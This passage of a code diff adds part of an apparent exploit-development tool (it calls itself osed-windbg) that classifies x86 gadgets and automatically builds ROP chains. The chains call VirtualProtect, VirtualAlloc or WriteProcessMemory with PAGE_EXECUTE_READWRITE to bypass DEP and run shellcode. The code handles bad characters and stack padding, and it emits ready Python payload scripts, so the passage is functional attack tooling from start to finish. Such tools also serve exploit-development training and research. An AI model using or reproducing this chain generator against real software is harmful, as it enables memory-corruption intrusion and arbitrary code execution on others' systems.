+        if (operands[0] === "esp") {
+          add({ kind: "STACK_ADJUST", evidence: [text] });
+        }
+      }
+      if (step.instruction.mnemonic === "call" && operands.length === 1) {
+        add({
+          kind: operands[0].includes("[") ? "DISPATCH_CALL_MEMORY" : "DISPATCH_CALL_REGISTER",
+          register: operands[0].includes("[") ? void 0 : operands[0],
+          evidence: [text]
+        });
+      }
+      if (step.instruction.mnemonic === "jmp" && operands.length === 1) {
+        if (operands[0].includes("[")) {
+          add({ kind: "DISPATCH_JMP_MEMORY", evidence: [text] });
+        } else {
+          add({ kind: "DISPATCH_JMP_REGISTER", register: operands[0], evidence: [text] });
+        }
+      }
+    }
+    for (const register2 of ["eax", "ecx", "edx", "ebx", "ebp", "esi", "edi"]) {
+      const transform = semantic.summary.registerTransforms[register2];
+      if ((transform == null ? void 0 : transform.kind) === "affine" && transform.base === "esp" && transform.offset.kind === "constant" && transform.offset.value === 0) {
+        add({ kind: "STACK_POINTER_CAPTURE", register: register2, targetRegister: "esp", evidence: ["balanced push esp / pop register"] });
+      }
+    }
+    if (categories.includes("STACK_PIVOT")) {
+      add({ kind: "STACK_PIVOT", evidence: ["category:STACK_PIVOT"] });
+    }
+    if (categories.includes("STACK_ADJUST")) {
+      add({ kind: "STACK_ADJUST", evidence: ["category:STACK_ADJUST"] });
+    }
+    return capabilities;
+  }
+
+  // src/rop/chain.ts
+  var stableAddressHint;
+  function setStableAddressHint(hint) {
+    stableAddressHint = hint;
+  }
+  function getStableAddressHint() {
+    return stableAddressHint;
+  }
+  function isAddressStable(address) {
+    return !stableAddressHint || stableAddressHint(address);
+  }
+  function gadgetStability(gadget) {
+    const addr = firstKnownAddress(gadget);
+    return addr !== void 0 && !isAddressStable(addr) ? 1 : 0;
+  }
+  function firstKnownAddress(gadget) {
+    const known = gadget.locations.filter((entry) => entry.virtualAddress !== void 0);
+    if (known.length === 0)
+      return void 0;
+    if (stableAddressHint) {
+      const stable = known.find((entry) => stableAddressHint(__bi(entry.virtualAddress)));
+      if (stable)
+        return __bi(stable.virtualAddress);
+    }
+    const location = known[0];
+    return (location == null ? void 0 : location.virtualAddress) !== void 0 ? __bi(location.virtualAddress) : void 0;
+  }
+  function retImmBytes(gadget) {
+    const last = gadget.instructions[gadget.instructions.length - 1];
+    if (!last || last.mnemonic !== "ret")
+      return -1;
+    if (last.operands.length === 0)
+      return 0;
+    const text = last.operands[0].trim();
+    const value = text.startsWith("0x") ? parseInt(text, 16) : parseInt(text, 10);
+    return Number.isFinite(value) && value >= 0 ? value : -1;
+  }
+  function retImmPadding(retImm) {
+    if (retImm <= 0)
+      return [];
+    const padWords = retImm / 4;
+    const steps = [];
+    for (let i = 0; i < padWords; i++) {
+      steps.push({ kind: "value", value: 1094795585, comment: `padding (ret ${retImm} compensation)` });
+    }
+    return steps;
+  }
+  function fixRetImmPadding(steps) {
+    const isPad = (s) => s.kind === "value" && typeof s.comment === "string" && s.comment.startsWith("padding (ret ");
+    const out = [];
+    let i = 0;
+    while (i < steps.length) {
+      if (isPad(steps[i])) {
+        const run = [];
+        while (i < steps.length && isPad(steps[i]))
+          run.push(steps[i++]);
+        if (i < steps.length && steps[i].kind === "gadget") {
+          out.push(steps[i++]);
+          out.push(...run);
+        } else {
+          out.push(...run);
+        }
+      } else {
+        out.push(steps[i++]);
+      }
+    }
+    return out;
+  }
+  function isSinglePopRetLike(gadget, register2) {
+    if (gadget.instructions.length !== 2)
+      return false;
+    const [pop, ret] = gadget.instructions;
+    return pop.mnemonic === "pop" && pop.operands.length === 1 && pop.operands[0].trim().toLowerCase() === register2 && ret.mnemonic === "ret";
+  }
+  function selectPopGadget(index, register2) {
+    const candidates2 = index.loadRegister(register2).filter((g) => isSinglePopRetLike(g, register2) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => gadgetStability(a) - gadgetStability(b) || b.score - a.score)[0];
+    if (plainRet)
+      return { gadget: plainRet, retImm: 0 };
+    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+      const stab = gadgetStability(a) - gadgetStability(b);
+      if (stab !== 0)
+        return stab;
+      const diff = retImmBytes(a) - retImmBytes(b);
+      return diff !== 0 ? diff : b.score - a.score;
+    })[0];
+    if (withImm)
+      return { gadget: withImm, retImm: retImmBytes(withImm) };
+    return void 0;
+  }
+  function isZeroRetLike(gadget, register2) {
+    if (gadget.instructions.length !== 2)
+      return false;
+    const [xor, ret] = gadget.instructions;
+    return xor.mnemonic === "xor" && xor.operands.length === 2 && xor.operands[0].trim().toLowerCase() === register2 && xor.operands[1].trim().toLowerCase() === register2 && ret.mnemonic === "ret";
+  }
+  function selectZeroGadget(index, register2) {
+    const candidates2 = index.zeroRegister(register2).filter((g) => isZeroRetLike(g, register2) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => b.score - a.score)[0];
+    if (plainRet)
+      return { gadget: plainRet, retImm: 0 };
+    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+      const diff = retImmBytes(a) - retImmBytes(b);
+      return diff !== 0 ? diff : b.score - a.score;
+    })[0];
+    if (withImm)
+      return { gadget: withImm, retImm: retImmBytes(withImm) };
+    return void 0;
+  }
+  function popSequenceInfo(gadget) {
+    const instructions = gadget.instructions;
+    if (instructions.length < 2)
+      return void 0;
+    const imm = retImmBytes(gadget);
+    if (imm < 0)
+      return void 0;
+    const registers = [];
+    for (let index = 0; index < instructions.length - 1; index += 1) {
+      const step = instructions[index];
+      if (step.mnemonic !== "pop" || step.operands.length !== 1)
+        return void 0;
+      registers.push(step.operands[0].trim().toLowerCase());
+    }
+    return { registers, retImm: imm };
+  }
+  function valueComment(register2, value) {
+    return `${register2} = 0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+  function planRegisterSetup(index, targets, badchars = [], valueSolver) {
+    const steps = [];
+    const satisfied = [];
+    const unsatisfied = [];
+    const remaining = /* @__PURE__ */ new Map();
+    const order = [];
+    for (const target of targets) {
+      const register2 = target.register.trim().toLowerCase();
+      if (!remaining.has(register2)) {
+        order.push(register2);
+      }
+      remaining.set(register2, target.value >>> 0);
+    }
+    for (const register2 of order) {
+      if (remaining.get(register2) !== 0) {
+        continue;
+      }
+      const selection = selectZeroGadget(index, register2);
+      if (selection) {
+        const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+        steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `xor ${register2}, ${register2} ; ret${retSuffix} (${register2} = 0)` });
+        steps.push(...retImmPadding(selection.retImm));
+        satisfied.push(register2);
+        remaining.delete(register2);
+      }
+    }
+    const popSequences = index.gadgets.map((gadget) => ({ gadget, info: popSequenceInfo(gadget) })).filter((entry) => entry.info !== void 0 && entry.info.registers.length >= 2 && firstKnownAddress(entry.gadget) !== void 0);
+    let progressed = true;
+    while (progressed) {
+      progressed = false;
+      let best;
+      for (const candidate of popSequences) {
+        const { registers } = candidate.info;
+        const distinct = new Set(registers).size === registers.length;
+        if (!distinct || !registers.every((register2) => remaining.has(register2))) {
+          continue;
+        }
+        if (!best || candidate.info.retImm < best.info.retImm || candidate.info.retImm === best.info.retImm && registers.length > best.info.registers.length || candidate.info.retImm === best.info.retImm && registers.length === best.info.registers.length && candidate.gadget.score > best.gadget.score) {
+          best = candidate;
+        }
+      }
+      if (best) {
+        const retSuffix = best.info.retImm > 0 ? ` ${best.info.retImm}` : "";
+        steps.push({ kind: "gadget", address: firstKnownAddress(best.gadget), comment: `${best.info.registers.map((register2) => `pop ${register2}`).join(" ; ")} ; ret${retSuffix}` });
+        for (const register2 of best.info.registers) {
+          const value = remaining.get(register2) >>> 0;
+          steps.push({ kind: "value", value, comment: valueComment(register2, value) });
+          satisfied.push(register2);
+          remaining.delete(register2);
+        }
+        steps.push(...retImmPadding(best.info.retImm));
+        progressed = true;
+      }
+    }
+    for (const register2 of order) {
+      if (!remaining.has(register2)) {
+        continue;
+      }
+      const selection = selectPopGadget(index, register2);
+      if (!selection) {
+        const reason = index.loadRegister(register2).length > 0 ? "only multi-pop or address-less load gadgets available" : "no pop gadget found for register";
+        unsatisfied.push({ register: register2, reason });
+        remaining.delete(register2);
+        continue;
+      }
+      const value = remaining.get(register2) >>> 0;
+      const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+      steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `pop ${register2} ; ret${retSuffix}` });
+      steps.push({ kind: "value", value, comment: valueComment(register2, value) });
+      steps.push(...retImmPadding(selection.retImm));
+      satisfied.push(register2);
+      remaining.delete(register2);
+    }
+    if (valueSolver && unsatisfied.length > 0) {
+      const resolved = [];
+      for (let i = 0; i < unsatisfied.length; i++) {
+        const { register: register2 } = unsatisfied[i];
+        const target = targets.find((t) => t.register.toLowerCase() === register2.toLowerCase());
+        if (!target)
+          continue;
+        const recipe = valueSolver(index, register2, target.value, badchars);
+        if (recipe) {
+          steps.push(...recipe.steps);
+          satisfied.push(register2);
+          resolved.push(i);
+        }
+      }
+      for (let j = resolved.length - 1; j >= 0; j--) {
+        unsatisfied.splice(resolved[j], 1);
+      }
+    }
+    return { steps, satisfied, unsatisfied, stackBytes: steps.length * 4 };
+  }
+  function hex32(value) {
+    const asBig = typeof value === "bigint" ? value : __bi(value >>> 0);
+    return `0x${asBig.toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+  function formatChainPython(plan) {
+    var _a;
+    const lines = ["from struct import pack", 'rop = b""'];
+    for (const step of plan.steps) {
+      const word = step.kind === "gadget" ? hex32(step.address) : (_a = step.placeholder) != null ? _a : hex32(step.value);
+      lines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
+    }
+    return lines;
+  }
+  function formatEmitPython(emit) {
+    const lines = [
+      `# Gadget assignment for plan ${emit.planId}: ${emit.strategy} / ${emit.shape}`,
+      `# Generated by osed-windbg`,
+      "",
+      "from struct import pack",
+      "",
+      "# --- Gadget addresses ---"
+    ];
+    for (const g of emit.gadgets) {
+      const name = g.capability.toLowerCase().replace(/_/g, "_");
+      lines.push(`${name} = ${hex32(g.address)}  # ${g.sequence} [${g.module}]`);
+    }
+    return lines;
+  }
+  function formatSynthesisPython(synth) {
+    var _a;
+    const lines = [
+      `# Stack layout for plan ${synth.planId}: ${synth.strategy} / ${synth.shape}`,
+      `# Entry path: ${synth.entryPath}`,
+      `# Status: ${synth.status}`
+    ];
+    if (synth.placeholders.length > 0) {
+      lines.push(`# TODO: resolve placeholders: ${synth.placeholders.join(", ")}`);
+    }
+    for (const v of synth.violations) {
+      lines.push(`# WARNING: ${v}`);
+    }
+    lines.push("");
+    lines.push("from struct import pack");
+    lines.push('payload = b""');
+    for (const slot of synth.slots) {
+      const word = slot.step.kind === "gadget" ? hex32(slot.step.address) : (_a = slot.step.placeholder) != null ? _a : hex32(slot.step.value);
+      const offsetLabel = slot.offset < 0 ? `${slot.offset}` : `+${slot.offset}`;
+      lines.push(`payload += pack("<I", ${word})  # [${offsetLabel}] ${slot.role}: ${slot.step.comment}`);
+    }
+    return lines;
+  }
+  function formatExportPython(emit, synth) {
+    const lines = [
+      "#!/usr/bin/env python3",
+      `# osed-windbg ROP export \u2014 plan ${emit.planId}: ${emit.strategy} / ${emit.shape}`,
+      "#"
+    ];
+    if (synth) {
+      lines.push(...formatSynthesisPython(synth));
+    } else {
+      lines.push(...formatEmitPython(emit));
+      lines.push("");
+      lines.push("# Run rop.synthesize() to get the full stack layout.");
+    }
+    lines.push("");
+    return lines;
+  }
+  function uniqueBytes2(values) {
+    const seen = /* @__PURE__ */ new Set();
+    for (const value of values != null ? values : []) {
+      if (Number.isInteger(value) && value >= 0 && value <= 255) {
+        seen.add(value & 255);
+      }
+    }
+    return [...seen].sort((a, b) => a - b);
+  }
+  function badcharHits(value, badchars) {
+    if (badchars.length === 0) {
+      return [];
+    }
+    const bad = new Set(badchars);
+    const hits = [];
+    const word = value >>> 0;
+    for (let offset = 0; offset < 4; offset += 1) {
+      const byte = word >>> offset * 8 & 255;
+      if (bad.has(byte) && !hits.includes(byte)) {
+        hits.push(byte);
+      }
+    }
+    return hits;
+  }
+  function byteList(bytes) {
+    return bytes.map((byte) => `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`).join(", ");
+  }
+  function planFlatStdcallFrame(entries, badchars) {
+    const normalizedBadchars = uniqueBytes2(badchars);
+    const placeholders = /* @__PURE__ */ new Set();
+    const badcharViolations = [];
+    const warnings = [];
+    const steps = entries.map((entry) => {
+      if (entry.value === void 0) {
+        placeholders.add(entry.placeholder);
+        warnings.push(`${entry.placeholder}: placeholder value must be checked against badchars after resolution.`);
+        return { kind: "value", placeholder: entry.placeholder, comment: entry.comment };
+      }
+      const value = entry.value >>> 0;
+      const hits = badcharHits(value, normalizedBadchars);
+      if (hits.length > 0) {
+        badcharViolations.push(`${entry.comment}: ${hex32(value)} contains badchar byte(s) ${byteList(hits)} in little-endian form.`);
+      }
+      return { kind: "value", value, comment: entry.comment };
+    });
+    return {
+      steps,
+      placeholders: [...placeholders],
+      badcharViolations,
+      warnings: [...warnings, ...badcharViolations],
+      badchars: normalizedBadchars,
+      stackBytes: steps.length * 4
+    };
+  }
+  function planVirtualProtectFrame(params = {}) {
+    var _a, _b;
+    return planFlatStdcallFrame([
+      { value: params.virtualProtect, placeholder: "VIRTUALPROTECT", comment: "ret target: VirtualProtect" },
+      { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after VirtualProtect" },
+      { value: params.lpAddress, placeholder: "LP_ADDRESS", comment: "lpAddress" },
+      { value: (_a = params.dwSize) != null ? _a : 513, placeholder: "DW_SIZE", comment: "dwSize" },
+      { value: (_b = params.flNewProtect) != null ? _b : 64, placeholder: "FL_NEW_PROTECT", comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+      { value: params.writable, placeholder: "WRITABLE", comment: "lpflOldProtect (writable dummy)" }
+    ], params.badchars);
+  }
+  function planWriteProcessMemoryFrame(params = {}) {
+    var _a;
+    return planFlatStdcallFrame([
+      { value: params.writeProcessMemory, placeholder: "WRITEPROCESSMEMORY", comment: "ret target: WriteProcessMemory" },
+      { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after WriteProcessMemory" },
+      { value: (_a = params.hProcess) != null ? _a : 4294967295, placeholder: "HPROCESS", comment: "hProcess = GetCurrentProcess() pseudo-handle" },
+      { value: params.lpBaseAddress, placeholder: "LP_BASE_ADDRESS", comment: "lpBaseAddress (executable destination)" },
+      { value: params.lpBuffer, placeholder: "LP_BUFFER", comment: "lpBuffer (source shellcode)" },
+      { value: params.nSize, placeholder: "NSIZE", comment: "nSize" },
+      { value: params.writable, placeholder: "WRITABLE", comment: "lpNumberOfBytesWritten (writable dummy)" }
+    ], params.badchars);
+  }
+  function planVirtualAllocFrame(params = {}) {
+    var _a, _b, _c;
+    return planFlatStdcallFrame([
+      { value: params.virtualAlloc, placeholder: "VIRTUALALLOC", comment: "ret target: VirtualAlloc" },
+      { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after VirtualAlloc" },
+      { value: params.lpAddress, placeholder: "LP_ADDRESS", comment: "lpAddress" },
+      { value: (_a = params.dwSize) != null ? _a : 513, placeholder: "DW_SIZE", comment: "dwSize" },
+      { value: (_b = params.flAllocationType) != null ? _b : 4096, placeholder: "FL_ALLOCATION_TYPE", comment: "flAllocationType = MEM_COMMIT" },
+      { value: (_c = params.flProtect) != null ? _c : 64, placeholder: "FL_PROTECT", comment: "flProtect = PAGE_EXECUTE_READWRITE" }
+    ], params.badchars);
+  }
+  function isPushadRet(gadget) {
+    if (gadget.instructions.length !== 2) {
+      return false;
+    }
+    const [pushad, ret] = gadget.instructions;
+    return pushad.mnemonic === "pushad" && ret.mnemonic === "ret" && ret.operands.length === 0;
+  }
+  function findPushadRet(index) {
+    return index.gadgets.filter((gadget) => isPushadRet(gadget) && firstKnownAddress(gadget) !== void 0).sort((a, b) => gadgetStability(a) - gadgetStability(b) || b.score - a.score)[0];
+  }
+  function isPlainRet(gadget) {
+    return gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0;
+  }
+  function findPlainRet(index) {
+    return index.gadgets.filter((gadget) => isPlainRet(gadget) && firstKnownAddress(gadget) !== void 0).sort((a, b) => gadgetStability(a) - gadgetStability(b) || b.score - a.score)[0];
+  }
+  function named(value, placeholder) {
+    return value === void 0 ? { placeholder } : { value: value >>> 0 };
+  }
+  function hasBadchar(value, badchars) {
+    const w = value >>> 0;
+    for (let i = 0; i < 4; i++) {
+      if (badchars.has(w >>> i * 8 & 255))
+        return true;
+    }
+    return false;
+  }
+  function planPushadChain(index, specs, label, mode, constraints = [], badchars = [], setupSolver, preferStable) {
+    const steps = [];
+    const satisfied = [];
+    const unsatisfied = [];
+    const placeholders = /* @__PURE__ */ new Set();
+    const bc = new Set(badchars.map((b) => b & 255));
+    const taintedTargets = {};
+    const directSpecs = [];
+    for (const spec of specs) {
+      if (spec.missingReason) {
+        unsatisfied.push({ register: spec.register, reason: spec.missingReason });
+      } else if (spec.placeholder === void 0 && spec.value !== void 0 && bc.size > 0 && hasBadchar(spec.value, bc)) {
+        taintedTargets[spec.register] = spec.value >>> 0;
+      } else {
+        directSpecs.push(spec);
+      }
+    }
+    if (Object.keys(taintedTargets).length > 0) {
+      if (!setupSolver) {
+        for (const [register2, value] of Object.entries(taintedTargets)) {
+          unsatisfied.push({ register: register2, reason: `value ${hex32(value)} contains badchars and no value solver is available to construct it` });
+        }
+      } else {
+        const setup = setupSolver(index, taintedTargets, badchars, preferStable);
+        steps.push(...setup.steps);
+        satisfied.push(...setup.ordered);
+        unsatisfied.push(...setup.unresolved);
+      }
+    }
+    for (const spec of directSpecs) {
+      const selection = selectPopGadget(index, spec.register);
+      if (!selection) {
+        const reason = index.loadRegister(spec.register).length > 0 ? "only multi-pop or address-less load gadgets available" : "no pop gadget found for register";
+        unsatisfied.push({ register: spec.register, reason });
+        continue;
+      }
+      const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+      steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `pop ${spec.register} ; ret${retSuffix}` });
+      if (spec.placeholder) {
+        placeholders.add(spec.placeholder);
+        steps.push({ kind: "value", placeholder: spec.placeholder, comment: `${spec.register} = ${spec.placeholder} (${spec.meaning})` });
+      } else {
+        steps.push({ kind: "value", value: spec.value >>> 0, comment: `${spec.register} = ${hex32(spec.value)} (${spec.meaning})` });
+      }
+      steps.push(...retImmPadding(selection.retImm));
+      satisfied.push(spec.register);
+    }
+    const pushad = findPushadRet(index);
+    if (pushad) {
+      steps.push({ kind: "gadget", address: firstKnownAddress(pushad), comment: `pushad ; ret (builds the ${label} call frame and dispatches)` });
+    } else {
+      unsatisfied.push({ register: "pushad", reason: "no pushad ; ret gadget in corpus" });
+    }
+    const finalSteps = fixRetImmPadding(steps);
+    return {
+      steps: finalSteps,
+      satisfied,
+      unsatisfied,
+      placeholders: [...placeholders],
+      constraints,
+      hasPushad: pushad !== void 0,
+      mode,
+      stackBytes: finalSteps.length * 4
+    };
+  }
+  function virtualProtectDirectSpecs(params) {
+    var _a;
+    const flNewProtect = ((_a = params.flNewProtect) != null ? _a : 64) >>> 0;
+    return [
+      __spreadProps(__spreadValues({ register: "edi" }, named(params.virtualProtect, "VIRTUALPROTECT")), { meaning: "VirtualProtect (RET dispatches here)" }),
+      __spreadProps(__spreadValues({ register: "esi" }, named(params.returnAddress, "RETURN_ADDR")), { meaning: "return address after VirtualProtect (e.g. jmp esp)" }),
+      __spreadProps(__spreadValues({ register: "ebp" }, named(params.lpAddress, "LP_ADDRESS")), { meaning: "lpAddress (shellcode start)" }),
+      { register: "ebx", value: flNewProtect, meaning: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+      __spreadProps(__spreadValues({ register: "edx" }, named(params.writable, "WRITABLE")), { meaning: "lpflOldProtect (writable dummy)" }),
+      __spreadProps(__spreadValues({ register: "ecx" }, named(params.writable, "WRITABLE")), { meaning: "unused by VirtualProtect (writable)" }),
+      { register: "eax", value: 2425393296, meaning: "unused by VirtualProtect (junk)" }
+    ];
+  }
+  function virtualProtectRetSlideSpecs(params, retGadget) {
+    var _a, _b;
+    const retAddress = params.retGadget !== void 0 ? params.retGadget >>> 0 : retGadget ? Number(firstKnownAddress(retGadget)) : void 0;
+    const dwSize = ((_a = params.dwSize) != null ? _a : 513) >>> 0;
+    const flNewProtect = ((_b = params.flNewProtect) != null ? _b : 64) >>> 0;
+    return [
+      __spreadProps(__spreadValues({
+        register: "edi"
+      }, retAddress === void 0 ? {} : { value: retAddress }), {
+        missingReason: retAddress === void 0 ? "no plain ret gadget in corpus for RET-slide dispatch" : void 0,
+        meaning: "RET-slide gadget (first ret pops ESI into EIP)"
+      }),
+      __spreadProps(__spreadValues({ register: "esi" }, named(params.virtualProtect, "VIRTUALPROTECT")), { meaning: "VirtualProtect (called by RET-slide)" }),
+      __spreadProps(__spreadValues({ register: "ebp" }, named(params.returnAddress, "RETURN_ADDR")), { meaning: "return address after VirtualProtect (e.g. jmp esp)" }),
+      { register: "ebx", value: dwSize, meaning: "dwSize" },
+      { register: "edx", value: flNewProtect, meaning: "flNewProtect = PAGE_EXECUTE_READWRITE" },
+      __spreadProps(__spreadValues({ register: "ecx" }, named(params.writable, "WRITABLE")), { meaning: "lpflOldProtect (writable dummy)" }),
+      { register: "eax", value: 2425393296, meaning: "unused by VirtualProtect (junk)" }
+    ];
+  }
+  function planVirtualProtect(index, params = {}, setupSolver, preferStable) {
+    var _a, _b;
+    const mode = (_a = params.mode) != null ? _a : "ret-slide";
+    const badchars = (_b = params.badchars) != null ? _b : [];
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      if (mode === "direct") {
+        return planPushadChain(index, virtualProtectDirectSpecs(params), "VirtualProtect", "direct", [
+          "direct PUSHAD mode uses saved ESP as dwSize; verify the saved stack pointer is an acceptable size argument before using the chain."
+        ], badchars, setupSolver, preferStable);
+      }
+      return planPushadChain(index, virtualProtectRetSlideSpecs(params, findPlainRet(index)), "VirtualProtect", "ret-slide", [
+        "RET-slide PUSHAD mode uses saved ESP as lpAddress; verify ESP points into the shellcode/NOP sled when pushad executes."
+      ], badchars, setupSolver, preferStable);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+  function writeProcessMemorySpecs(params) {
+    return [
+      __spreadProps(__spreadValues({ register: "edi" }, named(params.writeProcessMemory, "WRITEPROCESSMEMORY")), { meaning: "WriteProcessMemory (RET dispatches here)" }),
+      __spreadProps(__spreadValues({ register: "esi" }, named(params.returnAddress, "RETURN_ADDR")), { meaning: "return address after WPM (e.g. shellcode or jmp esp)" }),
+      { register: "ebp", value: 4294967295, meaning: "hProcess = GetCurrentProcess() pseudo-handle" },
+      __spreadProps(__spreadValues({ register: "ebx" }, named(params.lpBuffer, "LP_BUFFER")), { meaning: "lpBuffer (source \u2014 shellcode on stack)" }),
+      __spreadProps(__spreadValues({ register: "edx" }, named(params.nSize, "NSIZE")), { meaning: "nSize (shellcode byte count)" }),
+      __spreadProps(__spreadValues({ register: "ecx" }, named(params.writable, "WRITABLE")), { meaning: "lpNumberOfBytesWritten (writable dummy)" }),
+      { register: "eax", value: 2425393296, meaning: "unused by WPM (nop sled)" }
+    ];
+  }
+  function planWriteProcessMemory(index, params = {}, setupSolver, preferStable) {
+    var _a;
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      return planPushadChain(index, writeProcessMemorySpecs(params), "WriteProcessMemory", "direct", [
+        "direct PUSHAD WriteProcessMemory uses saved ESP as lpBaseAddress; this is only a DEP bypass if that saved ESP is already an executable destination."
+      ], (_a = params.badchars) != null ? _a : [], setupSolver, preferStable);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+  function virtualAllocSpecs(params) {
+    var _a, _b;
+    const flAllocationType = ((_a = params.flAllocationType) != null ? _a : 4096) >>> 0;
+    const flProtect = ((_b = params.flProtect) != null ? _b : 64) >>> 0;
+    return [
+      __spreadProps(__spreadValues({ register: "edi" }, named(params.virtualAlloc, "VIRTUALALLOC")), { meaning: "VirtualAlloc (RET dispatches here)" }),
+      __spreadProps(__spreadValues({ register: "esi" }, named(params.returnAddress, "RETURN_ADDR")), { meaning: "return address after VirtualAlloc (e.g. push eax ; ret)" }),
+      __spreadProps(__spreadValues({ register: "ebp" }, named(params.lpAddress, "LP_ADDRESS")), { meaning: "lpAddress (NULL = OS chooses, or specific address)" }),
+      { register: "ebx", value: flAllocationType, meaning: `flAllocationType = ${hex32(flAllocationType)} (MEM_COMMIT)` },
+      { register: "edx", value: flProtect, meaning: `flProtect = ${hex32(flProtect)} (PAGE_EXECUTE_READWRITE)` },
+      { register: "ecx", value: 2425393296, meaning: "unused by VirtualAlloc (junk)" },
+      { register: "eax", value: 2425393296, meaning: "unused by VirtualAlloc (junk)" }
+    ];
+  }
+  function planVirtualAlloc(index, params = {}, setupSolver, preferStable) {
+    var _a;
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      return planPushadChain(index, virtualAllocSpecs(params), "VirtualAlloc", "direct", [
+        "direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape."
+      ], (_a = params.badchars) != null ? _a : [], setupSolver, preferStable);
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+
+  // src/rop/value_solver.ts
+  var SCRATCH_CANDIDATES = ["eax", "ecx", "edx", "ebx", "esi", "edi"];
+  var SUBREGISTER_PARENT = {
+    ax: "eax",
+    al: "eax",
+    ah: "eax",
+    bx: "ebx",
+    bl: "ebx",
+    bh: "ebx",
+    cx: "ecx",
+    cl: "ecx",
+    ch: "ecx",
+    dx: "edx",
+    dl: "edx",
+    dh: "edx",
+    si: "esi",
+    di: "edi",
+    bp: "ebp",
+    sp: "esp"
+  };
+  var X86_REGISTERS = /* @__PURE__ */ new Set([
+    "eax",
+    "ebx",
+    "ecx",
+    "edx",
+    "esi",
+    "edi",
+    "ebp",
+    "esp",
+    ...Object.keys(SUBREGISTER_PARENT)
+  ]);
+  var WRITE_DEST_MNEMONICS = /* @__PURE__ */ new Set([
+    "mov",
+    "movzx",
+    "movsx",
+    "lea",
+    "xor",
+    "or",
+    "and",
+    "add",
+    "sub",
+    "adc",
+    "sbb",
+    "inc",
+    "dec",
+    "neg",
+    "not",
+    "imul",
+    "shl",
+    "shr",
+    "sar",
+    "sal",
+    "rol",
+    "ror",
+    "bswap",
+    "xadd",
+    "cmovz",
+    "cmovnz",
+    "cmove",
+    "cmovne"
+  ]);
+  var STACK_UNSAFE_MNEMONICS = /* @__PURE__ */ new Set(["push", "pusha", "pushad", "leave", "enter", "call", "jmp", "int", "iret"]);
+  function normalizeRegister(operand) {
+    var _a;
+    const reg = operand == null ? void 0 : operand.trim().toLowerCase();
+    if (!reg || !X86_REGISTERS.has(reg))
+      return void 0;
+    return (_a = SUBREGISTER_PARENT[reg]) != null ? _a : reg;
+  }
+  function parseImmediate(operand) {
+    if (operand === void 0)
+      return void 0;
+    const t = operand.trim().toLowerCase();
+    if (/^0x[0-9a-f]+$/.test(t))
+      return parseInt(t, 16);
+    if (/^[0-9]+$/.test(t))
+      return parseInt(t, 10);
+    if (/^[0-9a-f]+h$/.test(t))
+      return parseInt(t.slice(0, -1), 16);
+    return void 0;
+  }
+  function gadgetEffects(gadget) {
+    var _a, _b, _c;
+    const insns = gadget.instructions;
+    const clobbers = /* @__PURE__ */ new Set();
+    const fillers = [];
+    let safe = true;
+    let reason;
+    const markUnsafe = (why) => {
+      if (safe) {
+        safe = false;
+        reason = why;
+      }
+    };
+    for (let i = 1; i < insns.length; i++) {
+      const insn = insns[i];
+      const mnemonic = insn.mnemonic.trim().toLowerCase();
+      if (mnemonic === "ret" || mnemonic === "retn")
+        break;
+      const rawDst = (_a = insn.operands[0]) == null ? void 0 : _a.trim().toLowerCase();
+      const dst = normalizeRegister(insn.operands[0]);
+      if (mnemonic === "pop") {
+        clobbers.add((_b = dst != null ? dst : rawDst) != null ? _b : "?");
+        fillers.push({ kind: "value", value: 1094795585, comment: `junk (${rawDst != null ? rawDst : "?"} side effect)` });
+        continue;
+      }
+      if ((mnemonic === "add" || mnemonic === "sub") && rawDst === "esp") {
+        const imm = parseImmediate(insn.operands[1]);
+        if (imm === void 0 || imm % 4 !== 0) {
+          markUnsafe(`${mnemonic} esp, ${(_c = insn.operands[1]) != null ? _c : "?"} is not a paddable 4-byte multiple`);
+          continue;
+        }
+        if (mnemonic === "sub") {
+          markUnsafe(`sub esp, 0x${imm.toString(16)} shifts ESP back into consumed stack`);
+          continue;
+        }
+        for (let k = 0; k < imm / 4; k++) {
+          fillers.push({ kind: "value", value: 1094795585, comment: `junk (add esp, 0x${imm.toString(16)})` });
+        }
+        continue;
+      }
+      if (STACK_UNSAFE_MNEMONICS.has(mnemonic)) {
+        markUnsafe(`${mnemonic} alters ESP/control unpredictably`);
+        continue;
+      }
+      if (dst === "esp") {
+        markUnsafe(`${mnemonic} writes ESP directly`);
+        continue;
+      }
+      if (mnemonic === "xchg") {
+        const a = normalizeRegister(insn.operands[0]);
+        const b = normalizeRegister(insn.operands[1]);
+        if (a === "esp" || b === "esp") {
+          markUnsafe("xchg with ESP");
+          continue;
+        }
+        if (a)
+          clobbers.add(a);
+        if (b)
+          clobbers.add(b);
+        continue;
+      }
+      if (mnemonic === "cmp" || mnemonic === "test" || mnemonic === "nop")
